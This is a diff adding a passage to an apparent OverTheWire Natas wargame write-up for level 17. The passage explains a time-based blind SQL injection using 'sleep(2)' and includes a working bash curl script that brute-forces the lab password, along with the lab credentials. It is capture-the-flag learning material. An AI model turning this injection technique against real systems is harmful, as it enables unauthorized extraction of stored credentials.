@@ -400,3 +400,38 @@ Running this we eventually get our password
 ```
 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 ```
+
+### [natas17](http://natas17.natas.labs.overthewire.org/)
+
+natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+The serverside code for level 17 is the exact same as level 15, but the echo statements that tell us if your query has succeeded have been commented out. So if we want to take the same style of approach to the problem we'll need to find a different way to determine if our queries have passed.
+
+We'll add a `and sleep(2)` to the end of our query, this will only run in the case that the `like binary` statement checking the password passes, so if we guess the right letter the query will take two seconds longer to respond, which we can track. Here's the new script
+
+```bash
+#!/usr/bin/env bash
+
+# run until the same password appears twice
+
+password='';
+echo "starting brute force attack";
+
+while true; do
+    for f in {a..z} {A..Z} {0..9}; do
+	reqtime=$(curl -o /dev/null -s -w '%{time_total}\n' -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw 'http://natas17.natas.labs.overthewire.org/index.php?debug&username=natas18%22%20and%20password%20like%20binary%20%27'$password$f'%25%27%20and%20sleep%282%29+%23')
+	if [[ $reqtime > 2 ]]
+	then
+	    password=$password$f
+	    break
+	fi
+    done
+    echo $password;
+done
+```
+
+We run this and slowly are given our password
+
+```
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+```
